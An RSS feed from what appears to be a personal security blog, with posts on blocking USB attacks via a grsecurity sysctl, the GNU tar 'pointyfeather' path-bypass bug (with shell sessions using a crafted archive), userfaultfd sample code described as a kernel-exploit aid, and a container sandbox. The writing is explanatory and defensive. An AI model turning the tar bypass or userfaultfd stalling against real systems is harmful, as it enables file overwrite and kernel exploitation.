<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	xmlns:georss="http://www.georss.org/georss"
        xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
        xmlns:media="http://search.yahoo.com/mrss/"><channel>
<title>https://blog.lizzie.io</title>
<atom:link href="https://blog.lizzie.io/rss.xml" rel="self" type="application/rss+xml" />
<link>https://blog.lizzie.io</link>
<description><![CDATA[]]></description>
<language>en</language>
<pubDate>Sun, 16 Nov 2025 14:37:31 -0800</pubDate>
<lastBuildDate>Sun, 16 Nov 2025 14:37:31 -0800</lastBuildDate>
<generator>Emacs 30.2 Org-mode 9.7.11</generator>
<webMaster>_@lizzie.io (Lizzie Dixon)</webMaster>
<image>
<url>http://orgmode.org/img/org-mode-unicorn-logo.png</url>
<title>https://blog.lizzie.io</title>
<link>https://blog.lizzie.io</link>
</image>

<item>
<title>Preventing USB Attacks with Grsecurity: BadUSB, poisontap, et al.</title>
<link>https://blog.lizzie.io/preventing-usb-attacks-with-grsecurity.html</link>
<author>_@lizzie.io (Lizzie Dixon)</author>
<guid isPermaLink="false">https://blog.lizzie.io/preventing-usb-attacks-with-grsecurity.html</guid>
<pubDate>Mon, 12 Dec 2016 04:46:00 -0800</pubDate>

<description><![CDATA[<p>
<b>An update to this post using the <code>linux-hardened</code> project is available <a href="https://blog.lizzie.io/preventing-usb-attacks-with-linux-hardened.html">here</a>.</b>
</p>

<p>
USB has some surprising security implications: when a device is
plugged in, the operating system generally loads the appropriate
driver and initializes it. For example, plugging a device into an
unlocked computer can execute code, since the device can act as a USB
keyboard. This is how the <a href="http://arstechnica.com/security/2014/07/this-thumbdrive-hacks-computers-badusb-exploit-makes-devices-turn-evil/">"BadUSB"</a> series of attacks work.
</p>

<p>
Samy Kamkar's <a href="https://github.com/samyk/poisontap">Poisontap</a> project has been getting a lot of press
recently. It's a little more interesting since it can work on locked
computers.
</p>

<blockquote>
<p>
When PoisonTap (Raspberry Pi Zero &amp; Node.js) is plugged into a
locked/password protected computer, it:
</p>

<ul class="org-ul">
<li>emulates an Ethernet device over USB (or Thunderbolt)</li>
<li>hijacks all Internet traffic from the machine (despite being a low
priority/unknown network interface)</li>
<li>siphons and stores HTTP cookies and sessions from the web browser
for the Alexa top 1,000,000 websites</li>
<li>exposes the internal router to the attacker, making it accessible
remotely via outbound WebSocket and DNS rebinding (thanks Matt
Austin for rebinding idea!)</li>
<li>installs a persistent web-based backdoor in HTTP cache for
hundreds of thousands of domains and common Javascript CDN URLs,
all with access to the user's cookies via cache poisoning</li>
<li>allows attacker to remotely force the user to make HTTP requests
and proxy back responses (GET &amp; POSTs) with the user's cookies on
any backdoored domain</li>
<li>does not require the machine to be unlocked</li>
<li>backdoors and remote access persist even after device is removed
and attacker sashays away</li>
</ul>
</blockquote>

<p>
<a href="https://grsecurity.net/">grsecurity</a> comes with a mitigation. If your grsecurity kernel is built
with <code>GRKERNSEC_DENYUSB</code>, then the <code>kernel.grsecurity.deny_new_usb</code>
sysctl lets you prevent new USB devices from being loaded:
</p>

<p>
<a href="https://grsecurity.net/test/grsecurity-3.1-4.8.14-201612110933.patch"><code>grsecurity-3.1-4.8.14-201612110933.patch:121501</code></a>
</p>
<blockquote>
<p>
a new sysctl option with name "deny_new_usb" will be created.
Setting its value to 1 will prevent any new USB devices from being
recognized by the OS.  Any attempted USB device insertion will be
logged.  This option is intended to be used against custom USB
devices designed to exploit vulnerabilities in various USB device
drivers.
</p>

<p>
For greatest effectiveness, this sysctl should be set after any
relevant init scripts.  This option is safe to enable in distros
as each user can choose whether or not to toggle the sysctl.
</p>
</blockquote>

<p>
I wrote a systemd service so that I can enable it on boot and suspend,
and <code>sudo systemctl stop deny_new_usb</code> when I actually want to use a
USB device.
</p>

<div class="org-src-container">
<pre class="src src-text">[Service]
Type=oneshot
ExecStart=/usr/bin/sysctl kernel.grsecurity.deny_new_usb=1
ExecStop=/usr/bin/sysctl kernel.grsecurity.deny_new_usb=0
RemainAfterExit=yes

[Install]
WantedBy=default.target suspend.target sleep.target
</pre>
</div>

<p>
and added a bit to <code>i3status</code>, so that I can see whether it's on or
not in my statusbar:
</p>

<div class="org-src-container">
<pre class="src src-sh">#!/bin/bash

set -e

i3status | while true; do
    read line
    if systemctl status deny_new_usb &gt;/dev/null
    then
        usb_status="USB 🔒"
    else
        usb_status="USB 🔓"
    fi
    echo "$usb_status | $line"
done
</pre>
</div>
]]></description>
</item>
<item>
<title>CVE-2016-6321 notes: "pointyfeather", a logic bug in GNU tar.</title>
<link>https://blog.lizzie.io/cve-2016-6321-notes.html</link>
<author>_@lizzie.io (Lizzie Dixon)</author>
<guid isPermaLink="false">https://blog.lizzie.io/cve-2016-6321-notes.html</guid>
<pubDate>Thu, 03 Nov 2016 21:09:00 -0700</pubDate>

<description><![CDATA[<p>
I read this document but had a little trouble understanding it at
first:
</p>

<p>
<a href="https://sintonen.fi/advisories/tar-extract-pathname-bypass.txt">"Vulnerability: POINTYFEATHER aka Tar extract pathname bypass"</a>:
</p>
<blockquote>
<p>
Tar will happily extract files &amp; directories into
an arbitrary location when supplied with a suitably
crafted archive file. If a target system is extracting
an attacker supplied file, the vulnerability can
be exploited to gain file overwrite capability. 
</p>
</blockquote>

<p>
So, some notes:
</p>

<p>
tar has a long history of security issues. For example, tar files can
contain paths like <code>/etc/motd</code> or <code>/home/lizzie/.bashrc</code> or
<code>../../.bashrc</code>. If these are extracted by a naive tar, they will be
written over existing files and probably give the author of the tar
file code execution.
</p>

<p>
So GNU tar has a feature to remove bad prefixes. For example,
</p>

<pre class="example" id="org5767d26">
lizzie@0ae488040cbf:~# tar tf bad.tar 
tar: Removing leading `../' from member names
../etc/motd
lizzie@0ae488040cbf:~# tar xf bad.tar
tar: Removing leading `../' from member names
lizzie@0ae488040cbf:~# ls
bad.tar  etc
lizzie@0ae488040cbf:~# ls etc/
motd
</pre>

<p>
And also GNU tar lets you specify which files to extract from a tar
file:
</p>

<pre class="example" id="org39b6906">
lizzie@0ae488040cbf:~# ls
example.tar
lizzie@0ae488040cbf:~# tar tf example.tar 
a
b
lizzie@0ae488040cbf:~# tar xf example.tar a
lizzie@0ae488040cbf:~# ls
a  example.tar
  
</pre>

<p>
But this isn't implemented the right way: first, the specification is
checked, and then the bad prefixes are removed. So a
maliciously-constructed path can match the specification, then be
sanitized into something that may not match the specification, and
then be extracted. So,
</p>

<pre class="example" id="orgca97239">
lizzie@0ae488040cbf:~# tar tf pointyfeather.tar 
tar: Removing leading `a/../' from member names
a/../example
lizzie@0ae488040cbf:~# tar xf pointyfeather.tar a
tar: Removing leading `a/../' from member names
lizzie@0ae488040cbf:~# ls
example  pointyfeather.tar
</pre>

<p>
The fixed version bails out immediately (<a href="https://lists.archlinux.org/pipermail/arch-security/2016-November/000758.html">1.29-2 on Arch Linux</a>):
</p>

<pre class="example" id="org15cf737">
[lizzie@empress misc]$ tar xf pointyfeather.tar a
tar: Removing leading `a/../' from member names
tar: a/../example: Member name contains '..'
tar: Exiting with failure status due to previous errors
</pre>
]]></description>
</item>
<item>
<title>Using userfaultfd: sample code!</title>
<link>https://blog.lizzie.io/using-userfaultfd.html</link>
<author>_@lizzie.io (Lizzie Dixon)</author>
<guid isPermaLink="false">https://blog.lizzie.io/using-userfaultfd.html</guid>
<pubDate>Sat, 22 Oct 2016 16:49:00 -0700</pubDate>

<description><![CDATA[<p>
<code>userfaultfd</code> is <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id%3D808">being used in kernel exploits</a> to <a href="https://cyseclabs.com/blog/cve-2016-6187-heap-off-by-one-exploit">temporarily stop
kernel execution</a>. I had trouble finding out how to use it, so I wrote
a little program. Some notes:
</p>

<ul class="org-ul">
<li>If you don't include <code>O_NONBLOCK</code> in the <code>userfaultfd</code> flags argument,
<code>poll</code> will always return a <code>POLLERR</code>.</li>
<li>The API is complicated by a backwards-compatibility mechanism. You're
supposed to issue some <code>ioctls</code> and examine the struct to check if it
supports the operations you want.</li>
<li><p>
It doesn't work to just check structs against for example
<code>UFFDIO_REGISTER</code> or <code>UFFDIO_COPY</code>. Instead you should check them
against <code>UFFD_API</code> and <code>UFFD_API_RANGE_IOCTLS</code>. This wasn't entirely
clear to me after reading the documentation:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 1: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/Documentation/vm/userfaultfd.txt?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3"><code>Documentation/vm/userfaultfd.txt@c8d2bc</code></a></label><pre class="src src-text">Once the userfaultfd has been enabled the UFFDIO_REGISTER ioctl should
be invoked (if present in the returned uffdio_api.ioctls bitmask) to
register a memory range in the userfaultfd by setting the
uffdio_register structure accordingly. 
</pre>
</div>

<p>
but after I looked at the source I realized it was just returning
<code>UFFD_API_RANGE_IOCTLS</code>...
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 2: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/fs/userfaultfd.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n871"><code>fs/userfaultfd.c:871@c8d2bc</code></a></label><pre class="src src-C">out_unlock:
        up_write(&amp;mm-&gt;mmap_sem);
        mmput(mm);
        if (!ret) {
                /*
                 * Now that we scanned all vmas we can already tell
                 * userland which ioctls methods are guaranteed to
                 * succeed on this range.
                 */
                if (put_user(UFFD_API_RANGE_IOCTLS,
                             &amp;user_uffdio_register-&gt;ioctls))
                        ret = -EFAULT;
        }
</pre>
</div>

<p>
which has, for example, <code>1 &lt;&lt; _UFFDIO_COPY</code> in it...
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 3: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/userfaultfd.h?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n25"><code>include/uapi/linux/userfaultfd.h:25@c8d2bc</code></a></label><pre class="src src-C">#define UFFD_API_RANGE_IOCTLS                   \
        ((__u64)1 &lt;&lt; _UFFDIO_WAKE |             \
         (__u64)1 &lt;&lt; _UFFDIO_COPY |             \
         (__u64)1 &lt;&lt; _UFFDIO_ZEROPAGE)

</pre>
</div>

<p>
which is <b>not</b> <code>UFFDIO_COPY</code>.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 4: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/userfaultfd.h?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n55"><code>include/uapi/linux/userfaultfd.h:55@c8d2bc</code></a></label><pre class="src src-C">#define UFFDIO_COPY             _IOWR(UFFDIO, _UFFDIO_COPY,     \
                                      struct uffdio_copy)

</pre>
</div></li>

<li>If the <code>struct uffdio_register</code> <code>.len</code> isn't a multiple of the page
size, you get an <code>EINVAL</code>.</li>

<li>If you don't initialize it correctly, polling or reading on fd gets a
<code>POLLERR</code>.</li>
</ul>

<p>
So, the program:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 5: </span><a href="https://blog.lizzie.io/using-userfaultfd/userfaultfd.c"><code>userfaultfd.c</code></a></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -lpthread userfaultfd.c -o userfaultfd" -*- */
/* Little illustration of userfaultfd. Set up a userfaultfd, mmap two
   pages. Whenever one of those pages is requested, fill it with a specific
   string.
*/
#include &lt;fcntl.h&gt;
#include &lt;poll.h&gt;
#include &lt;pthread.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;linux/userfaultfd.h&gt;

#define PAGESIZE 4096

int userfaultfd(int flags)
{
	return syscall(SYS_userfaultfd, flags);
}

void *print_virtual_memory(void *memory)
{
	fprintf(stderr, "%s", (char *)memory);
	fprintf(stderr, "%s", &amp;((char *)memory)[PAGESIZE]);
	return NULL;
}

int main (int argc, char **argv)
{
	int return_code = 0;

	int fd = 0;
	if ((fd = userfaultfd(O_NONBLOCK)) == -1) {
		fprintf(stderr, "++ userfaultfd failed: %m\n");
		goto cleanup_error;
	}
	/* When first opened the userfaultfd must be enabled invoking the
	   UFFDIO_API ioctl specifying a uffdio_api.api value set to UFFD_API
	   (or a later API version) which will specify the read/POLLIN protocol
	   userland intends to speak on the UFFD and the uffdio_api.features
	   userland requires. The UFFDIO_API ioctl if successful (i.e. if the
	   requested uffdio_api.api is spoken also by the running kernel and the
	   requested features are going to be enabled) will return into
	   uffdio_api.features and uffdio_api.ioctls two 64bit bitmasks of
	   respectively all the available features of the read(2) protocol and
	   the generic ioctl available. */
	struct uffdio_api api = { .api = UFFD_API };
	if (ioctl(fd, UFFDIO_API, &amp;api)) {
		fprintf(stderr, "++ ioctl(fd, UFFDIO_API, ...) failed: %m\n");
		goto cleanup_error;
	}
	/* "Once the userfaultfd has been enabled the UFFDIO_REGISTER ioctl
	   should be invoked (if present in the returned uffdio_api.ioctls
	   bitmask) to register a memory range in the userfaultfd by setting the
	   uffdio_register structure accordingly. The uffdio_register.mode
	   bitmask will specify to the kernel which kind of faults to track for
	   the range (UFFDIO_REGISTER_MODE_MISSING would track missing
	   pages). The UFFDIO_REGISTER ioctl will return the uffdio_register
	   . ioctls bitmask of ioctls that are suitable to resolve userfaults on
	   the range registered. Not all ioctls will necessarily be supported
	   for all memory types depending on the underlying virtual memory
	   backend (anonymous memory vs tmpfs vs real filebacked mappings)." */
	if (api.api != UFFD_API) {
		fprintf(stderr, "++ unexepcted UFFD api version.\n");
		goto cleanup_error;
	}
	/* mmap some pages, set them up with the userfaultfd. */
	void *pages = NULL;
	if ((pages = mmap(NULL, PAGESIZE * 2, PROT_READ,
			  MAP_PRIVATE | MAP_ANONYMOUS, 0, 0)) == MAP_FAILED) {
		fprintf(stderr, "++ mmap failed: %m\n");
		goto cleanup_error;
	}
	struct uffdio_register reg = {
		.mode = UFFDIO_REGISTER_MODE_MISSING,
		.range = {
			.start = (long) pages,
			.len = PAGESIZE * 2
		}
	};
	if (ioctl(fd, UFFDIO_REGISTER,  &amp;reg)) {
		fprintf(stderr, "++ ioctl(fd, UFFDIO_REGISTER, ...) failed: %m\n");
		goto cleanup_error;
	}
	if (reg.ioctls != UFFD_API_RANGE_IOCTLS) {
		fprintf(stderr, "++ unexpected UFFD ioctls.\n");
		goto cleanup_error;
	}
	/* start a thread that will fault... */
	pthread_t thread = {0};
	if (pthread_create(&amp;thread, NULL, print_virtual_memory, pages)) {
		fprintf(stderr, "++ pthread_create failed: %m\n");
		goto cleanup_error;
	}

	/* and then wait for the faults to happen. */
	char data[PAGESIZE] = "-- handled page fault.\n";
	struct pollfd evt = { .fd = fd, .events = POLLIN };
	while (poll(&amp;evt, 1, 10) &gt; 0) {
		/* unexpected poll events */
		if (evt.revents &amp; POLLERR) {
			fprintf(stderr, "++ POLLERR\n");
			goto cleanup_error;
		} else if (evt.revents &amp; POLLHUP) {
			fprintf(stderr, "++ POLLHUP\n");
			goto cleanup_error;
		}
		struct uffd_msg fault_msg = {0};
		if (read(fd, &amp;fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) {
			fprintf(stderr, "++ read failed: %m\n");
			goto cleanup_error;
		}
		char *place = (char *)fault_msg.arg.pagefault.address;
		if (fault_msg.event != UFFD_EVENT_PAGEFAULT
		    || (place != pages &amp;&amp; place != pages + PAGESIZE)) {
			fprintf(stderr, "unexpected pagefault?.\n");
			goto cleanup_error;
		}
		struct uffdio_copy copy = {
			.dst = (long) place,
			.src = (long) data,
			.len = PAGESIZE
		};
		if (ioctl(fd, UFFDIO_COPY, &amp;copy)) {
			fprintf(stderr, "++ ioctl(fd, UFFDIO_COPY, ...) failed: %m\n");
			goto cleanup_error;
		}
	}
	goto cleanup;
cleanup_error:
	return_code = 1;
cleanup:
	if (fd) close(fd);
	return return_code;
}
</pre>
</div>

<p>
and a modified one to pause in the kernel:
</p>
<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 6: </span><a href="https://blog.lizzie.io/using-userfaultfd/userfaultfd_kernel.c"><code>userfaultfd_kernel.c</code></a></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -lpthread userfaultfd_kernel.c -o userfaultfd_kernel" -*- */
/* Little illustration of userfaultfd. Set up a userfaultfd, mmap two
   pages. Whenever one of those pages is requested, fill it with a specific
   string.
*/
#include &lt;fcntl.h&gt;
#include &lt;poll.h&gt;
#include &lt;pthread.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/userfaultfd.h&gt;

struct thread_args {
	char *memory;
	int fd;
};

#define PAGESIZE 4096

int userfaultfd(int flags)
{
	return syscall(SYS_userfaultfd, flags);
}

void *write_virtual_memory(void *t_a)
{
	struct thread_args *args = (struct thread_args *) t_a;
	if (write(args-&gt;fd, args-&gt;memory, PAGESIZE) != PAGESIZE
	    || write(args-&gt;fd, args-&gt;memory + PAGESIZE, PAGESIZE) != PAGESIZE) {
		fprintf(stderr, "++ write failed: %m\n");
	}
	return NULL;
}

int main (int argc, char **argv)
{
	int return_code = 0;
	int fd = 0;
	int sockets[2] = {0};

	if (socketpair(AF_LOCAL, SOCK_SEQPACKET, 0, sockets)) {
		fprintf(stderr, "++ socketpair failed: %m\n");
		goto cleanup_error;
	}

	if ((fd = userfaultfd(O_NONBLOCK)) == -1) {
		fprintf(stderr, "++ userfaultfd failed: %m\n");
		goto cleanup_error;
	}
	/* When first opened the userfaultfd must be enabled invoking the
	   UFFDIO_API ioctl specifying a uffdio_api.api value set to UFFD_API
	   (or a later API version) which will specify the read/POLLIN protocol
	   userland intends to speak on the UFFD and the uffdio_api.features
	   userland requires. The UFFDIO_API ioctl if successful (i.e. if the
	   requested uffdio_api.api is spoken also by the running kernel and the
	   requested features are going to be enabled) will return into
	   uffdio_api.features and uffdio_api.ioctls two 64bit bitmasks of
	   respectively all the available features of the read(2) protocol and
	   the generic ioctl available. */
	struct uffdio_api api = { .api = UFFD_API };
	if (ioctl(fd, UFFDIO_API, &amp;api)) {
		fprintf(stderr, "++ ioctl(fd, UFFDIO_API, ...) failed: %m\n");
		goto cleanup_error;
	}
	/* "Once the userfaultfd has been enabled the UFFDIO_REGISTER ioctl
	   should be invoked (if present in the returned uffdio_api.ioctls
	   bitmask) to register a memory range in the userfaultfd by setting the
	   uffdio_register structure accordingly. The uffdio_register.mode
	   bitmask will specify to the kernel which kind of faults to track for
	   the range (UFFDIO_REGISTER_MODE_MISSING would track missing
	   pages). The UFFDIO_REGISTER ioctl will return the uffdio_register
	   . ioctls bitmask of ioctls that are suitable to resolve userfaults on
	   the range registered. Not all ioctls will necessarily be supported
	   for all memory types depending on the underlying virtual memory
	   backend (anonymous memory vs tmpfs vs real filebacked mappings)." */
	if (api.api != UFFD_API) {
		fprintf(stderr, "++ unexepcted UFFD api version.\n");
		goto cleanup_error;
	}
	/* mmap some pages, set them up with the userfaultfd. */
	void *pages = NULL;
	if ((pages = mmap(NULL, PAGESIZE * 2, PROT_READ,
			  MAP_PRIVATE | MAP_ANONYMOUS, 0, 0)) == MAP_FAILED) {
		fprintf(stderr, "++ mmap failed: %m\n");
		goto cleanup_error;
	}
	struct uffdio_register reg = {
		.mode = UFFDIO_REGISTER_MODE_MISSING,
		.range = {
			.start = (long) pages,
			.len = PAGESIZE * 2
		}
	};
	if (ioctl(fd, UFFDIO_REGISTER,  &amp;reg)) {
		fprintf(stderr, "++ ioctl(fd, UFFDIO_REGISTER, ...) failed: %m\n");
		goto cleanup_error;
	}
	if (reg.ioctls != UFFD_API_RANGE_IOCTLS) {
		fprintf(stderr, "++ unexpected UFFD ioctls.\n");
		goto cleanup_error;
	}
	/* start a thread that will fault... */
	pthread_t thread = {0};
	if (pthread_create(&amp;thread, NULL, write_virtual_memory,
			   &amp; (struct thread_args) {
				   .memory = pages,
				   .fd = sockets[1]
			   })) {
		fprintf(stderr, "++ pthread_create failed: %m\n");
		goto cleanup_error;
	}

	/* and then wait for the faults to happen. */
	char data[PAGESIZE] = "-- handled page fault.\n";
	struct pollfd evts[2] = {
		{ .fd = fd, .events = POLLIN },
		{ .fd = sockets[0], .events = POLLIN }
	};
	while (poll(evts, sizeof(evts) / sizeof(struct pollfd), 10) &gt; 0) {
		/* unexpected poll events */
		if (evts[0].revents &amp; POLLERR
		    || evts[1].revents &amp; POLLERR) {
			fprintf(stderr, "++ POLLERR\n");
			goto cleanup_error;
		} else if (evts[0].revents &amp; POLLHUP
			   || evts[1].revents &amp; POLLHUP) {
			fprintf(stderr, "++ POLLHUP\n");
			goto cleanup_error;
		}		
		/* handle the userfaultfd data */
		if (evts[0].revents &amp; POLLIN) {
			struct uffd_msg fault_msg = {0};
			if (read(fd, &amp;fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) {
				fprintf(stderr, "++ read failed: %m\n");
				goto cleanup_error;
			}
			char *place = (char *)fault_msg.arg.pagefault.address;
			if (fault_msg.event != UFFD_EVENT_PAGEFAULT
			    || (place != pages &amp;&amp; place != pages + PAGESIZE)) {
				fprintf(stderr, "unexpected pagefault?.\n");
				goto cleanup_error;
			}
			struct uffdio_copy copy = {
				.dst = (long) place,
				.src = (long) data,
				.len = PAGESIZE
			};
			if (ioctl(fd, UFFDIO_COPY, &amp;copy)) {
				fprintf(stderr, "++ ioctl(fd, UFFDIO_COPY, ...) failed: %m\n");
				goto cleanup_error;
			}
		}
		/* handle the child thread's data */
		if (evts[1].revents &amp; POLLIN) {
			char msg[PAGESIZE] = {0};
			if (read(sockets[0], &amp;msg, sizeof(msg)) == -1) {
				fprintf(stderr, "++ read failed: %m\n");
				goto cleanup_error;
			}
			printf("%s", msg);
		}
	}
	goto cleanup;
cleanup_error:
	return_code = 1;
cleanup:
	if (fd) close(fd);
	if (sockets[0]) close(sockets[0]);
	if (sockets[1]) close(sockets[1]);
	return return_code;
}
</pre>
</div>
]]></description>
</item>
<item>
<title>Linux Containers in 500 Lines of Code</title>
<link>https://blog.lizzie.io/linux-containers-in-500-loc.html</link>
<author>_@lizzie.io (Lizzie Dixon)</author>
<guid isPermaLink="false">https://blog.lizzie.io/linux-containers-in-500-loc.html</guid>
<pubDate>Mon, 17 Oct 2016 04:51:00 -0700</pubDate>

<description><![CDATA[<p>
I've used Linux containers directly and indirectly for years, but I
wanted to become more familiar with them. So I wrote some code. This
used to be 500 lines of code, I swear, but I've revised it some since
publishing; I've ended up with about 70 lines more.
</p>

<p>
I wanted specifically to find a minimal set of restrictions to run
untrusted code. This isn't how you should approach containers on
anything with any exposure: you should restrict everything you
can. But I think it's important to know which permissions are
categorically unsafe! I've tried to back up things I'm saying with
links to code or people I trust, but <a href="mailto:_@lizzie.io">I'd love to know if I missed
anything.</a>
</p>

<p>
This is a <a href="https://www.cs.tufts.edu/~nr/noweb/"><code>noweb</code></a>-style piece of literate code. References named
<code>&lt;&lt;x&gt;&gt;</code> will be expanded to the code block named <code>x</code>. You can find the
tangled source <a href="https://blog.lizzie.io/linux-containers-in-500-loc/contained.c">here</a>. This document is an <a href="http://orgmode.org/">orgmode</a> document, you can
find its source <a href="https://blog.lizzie.io/linux-containers-in-500-loc.org">here</a>. This document and this code are licensed under
the GPLv3; you can find its source <a href="https://www.gnu.org/licenses/gpl-3.0.en.html">here</a>.
</p>
<div id="outline-container-org2f9dda7" class="outline-3">
<h3 id="org2f9dda7">Container setup</h3>
<div class="outline-text-3" id="text-org2f9dda7">
<p>
There are several complementary and overlapping mechanisms that make
up modern Linux containers. Roughly,
</p>

<ul class="org-ul">
<li><code>namespaces</code> are used to group kernel objects into different sets
that can be accessed by specific process trees. For example, pid
namespaces limit the view of the process list to the processes
within the namespace. There are a couple of different kind of
namespaces. I'll go into this more later.</li>
<li><code>capabilities</code> are used here to set some coarse limits on what uid 0
can do.</li>
<li><code>cgroups</code> is a mechanism to limit usage of resources like memory,
disk io, and cpu-time.</li>
<li><code>setrlimit</code> is another mechanism for limiting resource usage. It's
older than cgroups, but can do some things cgroups can't.</li>
</ul>

<p>
These are all Linux kernel mechanisms. Seccomp, capabilities, and
<code>setrlimit</code> are all done with system calls. <code>cgroups</code> is accessed
through a filesystem.
</p>

<p>
There's a lot here, and the scope of each mechanism is pretty
unclear. They overlap a lot and it's tricky to find the best way to
limit things. User namespaces are somewhat new, and promise to unify a
lot of this behavior. But unfortunately compiling the kernel with user
namespaces enabled complicates things. Compiling with user namespaces changes the
semantics of capabilities system-wide, which could cause more problems
or at least confusion. There have been a
large number of privilege-escalation bugs exposed by user
namespaces. <a href="https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/2016/april/ncc_group_understanding_hardening_linux_containers-1-1.pdf">"Understanding and Hardening Linux Containers"</a> explains
</p>

<blockquote>
<p>
Despite the large upsides the user namespace provides in terms of
security, due to the sensitive nature of the user namespace,
somewhat conflicting security models and large amount of new code,
several serious vulnerabilities have been discovered and new
vulnerabilities have unfortunately continued to be discovered.
These deal with both the implementation of user namespaces itself or
allow the illegitimate or unintended use of the user namespace to
perform a privilege escalation. Often these issues present
themselves on systems where containers are not being used, and where
the kernel version is recent enough to support user namespaces.
</p>
</blockquote>

<p>
It's turned off by default in Linux at the time of this
writing, but many distributions apply patches
to turn it on in a limited way.
</p>


<p>
But all of these issues apply to hosts with user namespaces compiled
in; it doesn't really matter whether we use user namespaces or not,
especially since I'll be preventing nested user namespaces. So I'll
only use a user namespace if they're available.
</p>

<p>
(The user-namespace handling in this code was originally pretty
broken. Jann Horn in particular gave great feedback. Thanks!)
</p>
</div>
</div>
<div id="outline-container-orgbd0e49a" class="outline-3">
<h3 id="orgbd0e49a"><code>contained.c</code></h3>
<div class="outline-text-3" id="text-orgbd0e49a">
<p>
This program can be used like this, to run <code>/misc/img/bin/sh</code> in
<code>/misc/img</code> as <code>root</code>:
</p>

<pre class="example" id="org0b01434">
[lizzie@empress l-c-i-500-l]$ sudo ./contained -m ~/misc/busybox-img/ -u 0 -c /bin/sh
=&gt; validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.oQ5jOY...done.
=&gt; trying a user namespace...writing /proc/32627/uid_map...writing /proc/32627/gid_map...done.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
/ # whoami
root
/ # hostname
05fe5c-three-of-pentacles
/ # exit
=&gt; cleaning cgroups...done.
</pre>

<p>
So, a skeleton for it:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 7: </span><code>contained.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -lcap -lseccomp contained.c -o contained" -*- */
/* This code is licensed under the GPLv3. You can find its text here:
   https://www.gnu.org/licenses/gpl-3.0.en.html */


#define _GNU_SOURCE
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;grp.h&gt;
#include &lt;pwd.h&gt;
#include &lt;sched.h&gt;
#include &lt;seccomp.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/capability.h&gt;
#include &lt;sys/mount.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;sys/resource.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/utsname.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;linux/capability.h&gt;
#include &lt;linux/limits.h&gt;

struct child_config {
	int argc;
	uid_t uid;
	int fd;
	char *hostname;
	char **argv;
	char *mount_dir;
};

&lt;&lt;capabilities&gt;&gt;

&lt;&lt;mounts&gt;&gt;

&lt;&lt;syscalls&gt;&gt;

&lt;&lt;resources&gt;&gt;

&lt;&lt;child&gt;&gt;

&lt;&lt;choose-hostname&gt;&gt;

int main (int argc, char **argv)
{
	struct child_config config = {0};
	int err = 0;
	int option = 0;
	int sockets[2] = {0};
	pid_t child_pid = 0;
	int last_optind = 0;
	while ((option = getopt(argc, argv, "c:m:u:"))) {
		switch (option) {
		case 'c':
			config.argc = argc - last_optind - 1;
			config.argv = &amp;argv[argc - config.argc];
			goto finish_options;
		case 'm':
			config.mount_dir = optarg;
			break;
		case 'u':
			if (sscanf(optarg, "%d", &amp;config.uid) != 1) {
				fprintf(stderr, "badly-formatted uid: %s\n", optarg);
				goto usage;
			}
			break;
		default:
			goto usage;
		}
		last_optind = optind;
	}
finish_options:
	if (!config.argc) goto usage;
	if (!config.mount_dir) goto usage;

&lt;&lt;check-linux-version&gt;&gt;

	char hostname[256] = {0};
	if (choose_hostname(hostname, sizeof(hostname)))
		goto error;
	config.hostname = hostname;

&lt;&lt;namespaces&gt;&gt;

	goto cleanup;
usage:
